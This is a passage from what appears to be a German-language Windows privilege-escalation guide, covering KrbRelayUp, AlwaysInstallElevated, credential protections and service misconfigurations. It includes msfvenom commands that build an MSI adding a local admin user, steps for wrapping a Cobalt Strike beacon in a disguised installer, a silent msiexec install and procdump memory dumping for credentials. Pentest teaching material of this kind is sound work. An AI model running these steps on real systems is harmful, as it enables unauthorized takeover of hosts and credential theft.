Prüfen Sie die Richtlinien des tatsächlichen DC für [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) und [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), die Objekt-ACL der weitergeleiteten Identität sowie die Authentifizierungs- und Impersonation-Ebenen der ausgewählten COM-Klasse. Der Anmeldetyp und der Anmeldeinformationskontext des Aufrufers sind relevant: Eine WinRM-Sitzung kann sich anders verhalten als eine interaktive Anmeldung oder eine Anmeldung mit neuen Anmeldeinformationen. Auch Firewall-/OXID-Routing und installierte Updates können das Ergebnis beeinflussen. Betrachten Sie eine permissive Richtlinie oder eine passende ACL als Kandidaten für eine Überprüfung; eine passive Enumeration sollte keine COM-Coercion, Relay-Authentifizierung oder Verzeichnisschreibvorgänge auslösen. Ein Shadow Credential für ein Computerkonto kann zu einem Maschinenticket führen und nur dann, wenn dieses Konto über die erforderlichen Verzeichnisreplikationsrechte verfügt, zu einem separaten DCSync-Pfad.

Finden Sie den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Weitere Informationen zum Ablauf des Angriffs finden Sie unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese beiden Registrierungsschlüssel **aktiviert** sind (Wert **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Wenn Sie über eine meterpreter-Sitzung verfügen, können Sie diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwenden Sie den Befehl `Write-UserAddMSI` von power-up, um im aktuellen Verzeichnis eine Windows-MSI-Binärdatei zur Rechteausweitung zu erstellen. Dieses Skript schreibt ein vorkompiliertes MSI-Installationsprogramm, das zum Hinzufügen eines Benutzers/einer Gruppe auffordert (Sie benötigen daher GUI-Zugriff):

```
Write-UserAddMSI
```

Führen Sie einfach die erstellte Binärdatei aus, um Ihre Berechtigungen zu erweitern.

### MSI Wrapper

Lesen Sie dieses Tutorial, um zu erfahren, wie Sie mit diesen Tools einen MSI Wrapper erstellen. Beachten Sie, dass Sie eine „**.bat**“-Datei verpacken können, wenn Sie lediglich **Befehlszeilen ausführen** möchten.


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Erstellen** Sie mit Cobalt Strike oder Metasploit ein **neues Windows-EXE-TCP-Payload** unter `C:\privesc\beacon.exe`.
- Öffnen Sie **Visual Studio**, wählen Sie **Create a new project** und geben Sie „installer“ in das Suchfeld ein. Wählen Sie das Projekt **Setup Wizard** und klicken Sie auf **Next**.
- Geben Sie dem Projekt einen Namen, zum Beispiel **AlwaysPrivesc**, verwenden Sie `C:\privesc` als Speicherort, wählen Sie **place solution and project in the same directory** und klicken Sie auf **Create**.
- Klicken Sie so oft auf **Next**, bis Sie Schritt 3 von 4 erreicht haben (Dateien zum Einschließen auswählen). Klicken Sie auf **Add** und wählen Sie das soeben erstellte Beacon-Payload aus. Klicken Sie anschließend auf **Finish**.
- Markieren Sie das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändern Sie unter **Properties** **TargetPlatform** von **x86** zu **x64**.
  - Sie können weitere Eigenschaften ändern, etwa **Author** und **Manufacturer**, damit die installierte App legitimer aussieht.
- Klicken Sie mit der rechten Maustaste auf das Projekt und wählen Sie **View > Custom Actions**.
- Klicken Sie mit der rechten Maustaste auf **Install** und wählen Sie **Add Custom Action**.
- Doppelklicken Sie auf **Application Folder**, wählen Sie die Datei **beacon.exe** aus und klicken Sie auf **OK**. Dadurch wird sichergestellt, dass das Beacon-Payload ausgeführt wird, sobald der Installer gestartet wird.
- Ändern Sie unter **Custom Action Properties** **Run64Bit** auf **True**.
- **Erstellen** Sie es schließlich.
  - Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stellen Sie sicher, dass Sie die Plattform auf x64 gesetzt haben.

### MSI-Installation

So führen Sie die **Installation** der schädlichen `.msi`-Datei im **Hintergrund** aus:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Um diese Schwachstelle auszunutzen, kannst du Folgendes verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Detektoren

### Überwachungseinstellungen

Diese Einstellungen legen fest, was **protokolliert** wird. Daher solltest du darauf achten.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Bei Windows Event Forwarding ist es interessant zu wissen, wohin die Protokolle gesendet werden.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** dient der **Verwaltung lokaler Administratorpasswörter** und stellt sicher, dass jedes Passwort auf in eine Domäne eingebundenen Computern **einzigartig, zufällig und regelmäßig aktualisiert** ist. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern aufgerufen werden, denen über ACLs ausreichende Berechtigungen erteilt wurden. So können sie autorisierte Benutzer lokale Administratorpasswörter einsehen lassen.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Klartextpasswörter in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA-Schutz

Ab **Windows 8.1** führte Microsoft einen verbesserten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, **ihren Speicher auszulesen** oder Code einzuschleusen und so das System weiter abzusichern.\
[**Weitere Informationen zum LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es soll auf einem Gerät gespeicherte Zugangsdaten vor Bedrohungen wie Pass-the-Hash-Angriffen schützen. [**Weitere Informationen zu Credential Guard finden Sie hier.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Zwischengespeicherte Anmeldedaten

**Domänenanmeldedaten** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden für den Benutzer in der Regel Domänenanmeldedaten eingerichtet.\
[**Weitere Informationen zu zwischengespeicherten Anmeldedaten**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Benutzer und Gruppen

### Benutzer und Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegierte Gruppen

Wenn du **zu einer privilegierten Gruppe gehörst, kannst du möglicherweise deine Berechtigungen erweitern**. Erfahre hier mehr über privilegierte Gruppen und wie du sie ausnutzen kannst, um deine Berechtigungen zu erweitern:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows-Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante Tokens** und deren Ausnutzung zu erfahren:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen

```bash
qwinsta
klist sessions
```

### Home-Verzeichnisse

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Passwortrichtlinie

```bash
net accounts
```

### Inhalt der Zwischenablage abrufen

```bash
powershell -command "Get-Clipboard"
```

## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Prüfe beim Auflisten der Prozesse zunächst, **ob sich Passwörter in der Befehlszeile des Prozesses befinden**.\
Prüfe, ob du **eine laufende Binärdatei überschreiben** kannst oder Schreibberechtigungen für den Binärdateiordner hast, um mögliche [**DLL Hijacking-Angriffe**](dll-hijacking/index.html) auszunutzen:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Prüfe immer, ob [**electron/cef/chromium debuggers** laufen; du kannst sie zur Privilegieneskalation missbrauchen](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Ein Debugger-Listener kann nur kurzzeitig aktiv sein. Dass er in einer passiven Portaufnahme nicht zu sehen ist, beweist daher nicht, dass er nie verfügbar war. Ordne jeden beobachteten Listener seiner PID und dem Prozessbesitzer zu und prüfe, ob der Benutzer mit geringeren Privilegien ihn erreichen kann. Ein Anwendungsname oder Debug-Flag allein belegt keine Codeausführung über Benutzergrenzen hinweg. Führe die routinemäßige Enumeration passiv durch, anstatt Debugger-Befehle zu senden.

**Berechtigungen der Binärdateien von Prozessen prüfen**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Überprüfen der Berechtigungen der Ordner, in denen sich die Prozess-Binärdateien befinden (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort-Verzeichnisse für dynamische Präprozessoren

Snort 2 kann Shared Libraries aus einem `dynamicpreprocessor directory` laden, das in der mit `snort.exe -c <config>` ausgewählten Konfiguration angegeben ist. Prüfe bei einer geplanten Aufgabe oder einem Dienst, der Snort unter einem anderen Konto ausführt, genau diese Konfiguration und die ACL des angegebenen Modulverzeichnisses. Wenn dein Token dort Dateien erstellen kann, ist der Pfad ein Kandidat für eine Überprüfung auf Codeausführung, wenn diese Aufgabe oder dieser Dienst das nächste Mal Module lädt. Überprüfe die effektiven Berechtigungen des Run-as-Kontos, die aktive Konfiguration, die Modulkompatibilität sowie mögliche Deny- oder Freigabebeschränkungen; ein beschreibbares Verzeichnis allein belegt keine Rechteausweitung. Die [Dokumentation zu Snorts dynamischen Präprozessoren](https://www.snort.org/documents/dpx-readme) beschreibt das Laden von Modulen zur Laufzeit.

### Privilegierter Webdienst mit beschreibbarem Dokumentenstammverzeichnis

Vergleiche bei einer Windows-Apache-Installation den Pfad der ausführbaren Datei des Dienstes und das Run-as-Konto mit dem `DocumentRoot` in der aktiven `httpd.conf`. Prüfe bei einem üblichen XAMPP-Layout `C:\xampp\apache\conf\httpd.conf` und die ACL des konfigurierten Dokumentenstammverzeichnisses, oft `C:\xampp\htdocs`. Wenn ein Benutzer mit geringeren Berechtigungen Dateien in diesem Verzeichnis erstellen kann, während Apache als `LocalSystem` ausgeführt wird, kann serverseitige Codeausführung die Berechtigungsgrenze des Hosts überschreiten. Bestätige, dass der Dienst läuft, dass genau dieser Pfad bereitgestellt wird und dass ein serverseitiger Handler den Dateityp verarbeitet; ein beschreibbares Stammverzeichnis belegt für sich genommen nur die Möglichkeit, Dateien zu erstellen. Prüfe die ACLs, ohne eine Testdatei zu schreiben:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Bei einer herkömmlichen WAMP-Installation verweist der Dienst möglicherweise auf eine versionierte `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (oder bei einem 32-Bit-Layout auf `C:\wamp\...`); die Konfiguration befindet sich daneben unter `conf\httpd.conf`, und das Standard-Stammverzeichnis ist `C:\wamp64\www` oder `C:\wamp\www`. Prüfen Sie gemeinsam das genaue Dienstabbild, die Identität, unter der der Dienst ausgeführt wird, das effektive `DocumentRoot` (einschließlich der Expansion von `${INSTALL_DIR}` und Überschreibungen durch virtuelle Hosts) sowie die ACL des Stammverzeichnisses. Ein beschreibbares WAMP-Verzeichnis belegt nicht, dass Apache als `SYSTEM` läuft oder die abgelegte Datei ausführt. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Beschreibbares IIS-Stammverzeichnis und Netzwerkidentität des Anwendungspools

Ordnen Sie bei IIS ein beschreibbares physisches Verzeichnis einer **aktiven Website/Anwendung** in `applicationHost.config` zu und ermitteln Sie anschließend den konfigurierten Pool und den serverseitigen Handler. Code in einem bereitgestellten Verzeichnis wird nur dann als Pool ausgeführt, wenn IIS den Dateityp verarbeitet und die Route erreichbar ist. Prüfen Sie die effektiven Berechtigungen des aktuellen Benutzers zum Erstellen von Dateien, den Laufzeitstatus der Website, den Handler und pfadspezifische Überschreibungen, bevor Sie ein beschreibbares Verzeichnis als Codeausführungsmöglichkeit einstufen.

Die dynamische ASP.NET-Kompilierung eröffnet einen separaten Prüfpfad: generierte Dateien im Kompilierungsverzeichnis der Anwendung. Standardmäßig liegt dieses unter dem entsprechenden .NET Framework-Installationsverzeichnis in einem Verzeichnis namens `Temporary ASP.NET Files`, aber `<compilation tempDirectory>` der Anwendung kann den Pfad ändern. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) und [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Wenn ein Token mit geringeren Berechtigungen generierten Quellcode im Cache der **konkreten** Anwendung ändern kann, ermitteln Sie, ob diese Anwendung ihn unter einer privilegierteren [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) erneut kompiliert. Eine Datei- oder Verzeichnis-ACL allein belegt keine Codeausführung: Gleichen Sie den Cache mit der aktiven Anwendung, dem effektiven Token und der ACL, den Kompilierungseinstellungen, der Prozessidentität sowie dem Zeitpunkt einer möglichen Neukompilierung ab. Verwenden Sie eine schreibgeschützte Metadatenprüfung; lösen Sie während der Bestandsaufnahme keine Kompilierung aus und ändern Sie keine Cache-Dateien.

Ein IIS-Pool, der als `ApplicationPoolIdentity` oder `NetworkService` konfiguriert ist, authentifiziert sich bei Domänenressourcen häufig als **Computerkonto des Hosts**, auch wenn sein lokales Token nur geringe Berechtigungen hat. `LocalSystem` verfügt lokal bereits über weitreichende Berechtigungen und verwendet im Netzwerk ebenfalls das Computerkonto; `LocalService` verwendet normalerweise anonyme Netzwerk-Anmeldeinformationen. Ein Pool vom Typ `SpecificUser` verwendet stattdessen das dafür konfigurierte Konto. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) und [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Eine nicht angegebene Identitätseinstellung kann die Standardwerte des Pools übernehmen, die sich zwischen IIS-Versionen unterscheiden. Ermitteln Sie daher die effektive Konfiguration, statt anhand des Poolnamens zu raten. Wenn Codeausführung einen Pool mit Netzwerkidentität des Computerkontos erreicht, prüfen Sie die Verzeichnisrechte **dieses konkreten Computers**. [DCSync](../active-directory-methodology/dcsync.md) erfordert Replikationsrechte auf dem Domänennamenskontext; ein Computerkonto-Ticket oder eine Hostrolle allein belegt diese Rechte nicht. Eine passive Bestandsaufnahme sollte Konfiguration und ACLs prüfen, ohne eine Datei hochzuladen, eine Netzwerkauthentifizierung auszulösen oder Tickets anzufordern.

Bei einem lesbaren ASP.NET-Handler, der einen Hilfsprozess startet, verfolgen Sie jeden aus einer Anfrage stammenden Wert durch Authentifizierung, Entschlüsselung, Validierung und Befehlserstellung. Ein Handler, der ein dekodiertes Token an `ProcessStartInfo("cmd", "/c ...")` anhängt, kann es ermöglichen, dass Shell-Metazeichen den Befehl verändern; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stellen Sie fest, ob ein nicht vertrauenswürdiger Aufrufer den dekodierten Wert tatsächlich beeinflussen und den Handler erreichen kann. Ermitteln Sie anschließend die effektive Identität des Anwendungspools oder des impersonierten Benutzers sowie die Identität des Kindprozesses. Eine lesbare Quellcodezeile, ein Listener auf localhost oder eine Schwachstelle im Tokenformat allein belegt keine Ausführung privilegierter Befehle. Prüfen Sie Quellcode und Poolkonfiguration, ohne während einer passiven Bestandsaufnahme gefälschte Anfragen zu senden oder den Hilfsprozess auszuführen.

Bei einem PHP-Dienst unter Windows kann ein durch die Anfrage gesteuerter Pfad, der an [`include` or `require`](https://www.php.net/manual/en/function.include.php) übergeben wird, eine für den niedrigprivilegierten Benutzer beschreibbare PHP-Datei unter der Identität des Workers ausführen. Bestätigen Sie, dass die Anfrage die betreffende Anweisung erreichen kann, der aufgelöste Pfad auf eine Datei verweist, die der niedrigprivilegierte Benutzer ändern und der Worker lesen kann, geltende PHP-Pfadbeschränkungen das Include zulassen und der Worker tatsächlich mit höheren Berechtigungen ausgeführt wird. Ein Listener auf Loopback oder eine beschreibbare Datei allein belegt diese Angriffskette nicht. Prüfen Sie Quellcode, Dienstidentität und Datei-ACLs, ohne den Endpunkt während einer passiven Bestandsaufnahme aufzurufen.

### Mining von Passwörtern aus dem Arbeitsspeicher

Mit **procdump** aus Sysinternals können Sie einen Speicherauszug eines laufenden Prozesses erstellen. Dienste wie FTP haben **Anmeldedaten im Klartext im Arbeitsspeicher**. Versuchen Sie, den Speicher auszulesen und die Anmeldedaten zu lesen.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM laufen, können es einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: „Windows-Hilfe und Support“ (Windows + F1), nach „Eingabeaufforderung“ suchen, auf „Klicken Sie hier, um die Eingabeaufforderung zu öffnen“ klicken

### Import von Projektdateien mit höheren Rechten

Eine Anwendung, die Projekte automatisch aus einem für Benutzer mit niedrigeren Rechten beschreibbaren Drop-Verzeichnis öffnet, überschreitet eine Vertrauensgrenze für Eingaben unter dem Konto des Importers. Prüfen Sie den **genauen beschreibbaren Pfad**, den Prozess oder Task, der ihn öffnet, dessen effektive Identität und den Parser-Build. Ein [historisches Problem beim Öffnen/Wiederherstellen von Ghidra-Projekten](https://github.com/NationalSecurityAgency/ghidra/issues/71) ermöglichte externe XML-Entitäten in Projektmetadaten; eine Netzwerkentität unter Windows konnte eine Authentifizierung durch das importierende Konto auslösen, sofern die [Richtlinien für ausgehendes SMB und NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dies zulassen. Das ist ein Hinweis auf eine mögliche Offenlegung von Anmeldedaten, kein unmittelbarer Zugriff als Administrator: Die Antwort muss über einen separaten autorisierten oder verwundbaren Pfad nutzbar sein, und aktuelle Builds müssen anhand ihres tatsächlichen Patch-Status bewertet werden. Öffnen Sie während einer passiven Enumeration kein manipuliertes Projekt; prüfen Sie den Import-Workflow und die ACLs.

## Services

Das Recht [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) am Service Control Manager (SCM)-Objekt ist von den Rechten für einen bestehenden Service getrennt. Eine erfolgreiche schreibgeschützte [`OpenSCManager`-Zugriffsanfrage](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) für dieses Recht ist ein Prüfhinweis, kein Beweis dafür, dass ein neuer Service ausgeführt werden kann. [`CreateService` gibt ein Handle zurück](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), das beim Erstellen die angeforderten Service-Zugriffsrechte erhält; beim späteren erneuten Öffnen des Service erfolgt eine separate Zugriffsprüfung, die fehlschlagen kann, selbst wenn das ursprüngliche Handle verwendet werden könnte. Prüfen Sie separat das effektive lokale oder Remote-Token, die gewährten Handle-Rechte, das Service-Konto, die Start-Richtlinie und den ausführbaren Pfad. Erstellen oder starten Sie während einer passiven Enumeration keinen Service.

Bei einem Remote-Service-Installationspfad sollten Sie diese SCM-Rechte mit einer Freigabe auf dem Ziel abgleichen, in die **dieselbe Netzwerkanmeldung** schreiben kann, sowie mit der zugrunde liegenden NTFS-ACL und einem lokalen ausführbaren Pfad, den das Service-Konto ausführen kann. Ein Konto ohne Administratorrechte kann diese Grenze überschreiten, wenn ungewöhnlich weitreichende SCM-Rechte und der Dateiplatzierungspfad beide vorhanden sind; eine administrative Freigabe ist nicht zwingend erforderlich. Schreibzugriff auf eine Freigabe allein oder ein Hinweis auf das Recht, einen Service über SCM zu erstellen, belegt nicht, dass der neue Service mit höheren Rechten gestartet werden kann.

Ein bestehender Service kann bei Start, Beenden oder einem anderen Lebenszyklusereignis eine Hilfsdatei aufrufen, auch wenn diese nicht in seinem `ImagePath` angegeben ist. Wird der Name der Hilfsdatei in ein Verzeichnis mit Schreibrechten für einen Benutzer mit niedrigeren Rechten aufgelöst und läuft der Service mit höheren Rechten, kann eine fehlende Hilfsdatei unter bestimmten Bedingungen ersetzt werden. Bestätigen Sie den **tatsächlichen Service-Code oder den dokumentierten Aufruf der Hilfsdatei**, den aufgelösten ausführbaren Pfad und die Suchreihenfolge, die Rechte zum Erstellen von Verzeichnissen, die Service-Identität und einen verfügbaren Auslöser für den Lebenszyklus. Ein beschreibbares Service-Verzeichnis oder eine fehlende Datei allein belegt nicht, dass der Service die Datei lädt; starten oder beenden Sie den Service während einer passiven Prüfung nicht.

Bei einem bestehenden Service erlaubt [`SERVICE_START` das Übergeben von Argumenten an `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dieses Recht ist von [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) getrennt. Prüfen Sie den Code oder die dokumentierte Schnittstelle des Service, bevor Sie das Startrecht als mehr als ein Steuerungsrecht betrachten. Wenn der Service ein vom Aufrufer ausgewähltes Argument als Log- oder Exportpfad verwendet, prüfen Sie die Service-Identität, den genauen Ablauf vom Argument zum Schreibvorgang, Pfadbeschränkungen und die Berechtigungen der **erstellten Datei**. Ein Schreibvorgang in ein geschütztes Verzeichnis kann nur dann zur Rechteausweitung führen, wenn es einen separaten privilegierten Verbraucher oder Loader gibt, der diese Datei akzeptiert; ein beschreibbares Log oder ein Startrecht allein reicht nicht aus. Bei einer passiven Bestandsaufnahme sollte der Service weder gestartet noch eine Testdatei erstellt werden.

Bei einem NSClient++-Monitoring-Agenten ist eine lesbare `nsclient.ini` ein **Hinweis für die Konfigurationsprüfung**: Sie kann Web-Anmeldedaten enthalten, während `boot.ini` die Konfiguration an einen anderen Ort umleiten kann. Prüfen Sie das tatsächliche Service-Konto, den WEB-Listener und dessen Zugriffsrichtlinie sowie, ob die authentifizierte Rolle Einstellungen oder Skripte ändern kann. Eine privilegierte Ausführung erfordert zusätzlich `CheckExternalScripts` (oder einen anderen aktivierten Ausführungspfad), ein wirksames Recht zum Registrieren oder Ändern eines Befehls und einen Auslöser, der ihn unter der Service-Identität ausführt. Ein nur an Loopback gebundener Listener kann für einen lokalen Benutzer dennoch erreichbar sein, aber der Dateipfad, das Passwort oder der Listener allein belegen diese Rechte nicht. Prüfen Sie Metadaten und Berechtigungen, ohne während einer passiven Enumeration Geheimnisse anzuzeigen oder die Web-API aufzurufen. Siehe das [NSClient++-Dateilayout](https://nsclient.org/docs/concepts/file-layout/), die [Sicherheitshinweise zu Web und Skripten](https://nsclient.org/docs/setup/securing/) und die [Konfiguration externer Skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Bei einem Service, dessen `ImagePath` `nssm.exe` ist, prüfen Sie das tatsächliche Run-as-Konto des Service und seinen Wert `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM speichert dort die untergeordnete Anwendung](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), während `AppDirectory` das konfigurierte Arbeitsverzeichnis ist. Prüfen Sie die untergeordnete ausführbare Datei und die ACLs ihrer übergeordneten Verzeichnisse, bevor Sie die Berechtigungen des Wrappers als einzige Grenze des Service betrachten. Ein lokaler WCF- oder SOAP-Endpunkt, den diese untergeordnete Anwendung bereitstellt, ist ein separater Prüfhinweis: Bestätigen Sie, dass der Benutzer mit niedrigeren Rechten den Listener erreichen kann, dass die genaue Operation seine Eingabe akzeptiert und dass der untergeordnete Service die unsichere Operation mit höheren Rechten ausführt. Das Service-Konto, eine Endpunkt-URL oder ein beschreibbarer Pfad allein beweisen keine Rechteausweitung; rufen Sie während einer passiven Enumeration keine Service-Operationen auf.

Verfolgen Sie bei einer benutzerdefinierten WCF-Operation eine vom Aufrufer kontrollierte Zeichenfolge bis in eine PowerShell-Runspace. [`Pipeline.Commands.AddScript` fügt Skripttext hinzu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), und [`Pipeline.Invoke` führt die Pipeline aus](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Ein [`netTcpBinding` mit Windows-Transportanmeldedaten](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifiziert den Client, aber die Berechtigung zum Aufrufen dieser **konkreten** Operation und die effektive Identität der Runspace müssen separat geprüft werden. Ein Pfad von der Eingabe eines Aufrufers mit niedrigeren Rechten zu `AddScript` unter einer höheren Service-Identität ist eine Codeausführungsgrenze; ein lauschender Port, ein authentifizierter Client oder eine ungenutzte Methode in einer nicht zugehörigen Assembly allein ist kein Beweis. Prüfen Sie den bereitgestellten Service, den Vertrag, die Autorisierung und die Impersonation-Einstellungen statisch, ohne den Endpunkt während der Enumeration aufzurufen.

Service Triggers ermöglichen es Windows, einen Service zu starten, wenn bestimmte Bedingungen eintreten (Aktivität an benannten Pipes/RPC-Endpunkten, ETW-Ereignisse, IP-Verfügbarkeit, Geräteanschluss, GPO-Aktualisierung usw.). Auch ohne `SERVICE_START`-Rechte können Sie privilegierte Services oft durch Auslösen ihrer Trigger starten. Techniken zur Enumeration und Aktivierung finden Sie hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio-Dienst für die Diagnoseerfassung

Visual-Studio-Installationen mit C/C++-Tools können `VSStandardCollectorService150` enthalten, einen Diagnosedienst, der so konfiguriert ist, dass er als `LocalSystem` läuft. Bei [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wurden eine Junction und ein Object-Manager-Link-Race verwendet, um das Zurücksetzen einer Service-DACL umzuleiten. Für die demonstrierte Rechteausweitung waren außerdem ein nutzbarer MSI-Reparaturpfad des Visual Studio Setup WMI Providers und dessen Ziel `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` erforderlich. Die Komponente wurde im Januar 2024 korrigiert.

Prüfen Sie bei einer passiven Triage das Konto und den Binärpfad dieses Service, ob der Pfad zum Setup-WMI-Compiler vorhanden ist, und den Patch-Status der installierten Komponente. Ein Service-Eintrag, eine Visual-Studio-Produktversion oder eine Compilerdatei allein belegt nicht, dass der Host verwundbar ist. Für die Prüfung muss der Service weder gestartet noch eine Reparatur ausgeführt werden.

Eine Liste der Services abrufen:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Berechtigungen

Du kannst **sc** verwenden, um Informationen zu einem Dienst abzurufen.

```bash
sc qc <service_name>
```

Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu prüfen.

```bash
